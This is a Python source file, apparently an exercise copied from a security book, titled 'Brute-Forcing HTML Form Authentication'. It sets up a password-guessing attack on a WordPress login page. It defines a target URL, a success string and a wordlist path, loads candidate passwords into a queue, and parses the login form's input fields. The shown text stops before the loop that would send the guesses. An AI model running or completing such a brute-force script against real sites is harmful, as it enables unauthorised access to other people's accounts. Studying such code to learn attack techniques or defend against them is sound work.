#!/usr/bin/env python
"""
Brute-Forcing HTML Form Authentication
BHP: page 85

"""

from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS  = 'Welcome to WordPress!'
TARGET   = "http:boodleyoo.com/wordpress/wp-login.php"
WORDLIST = "./wordlist/cain.txt"

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):  # find all input elements
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params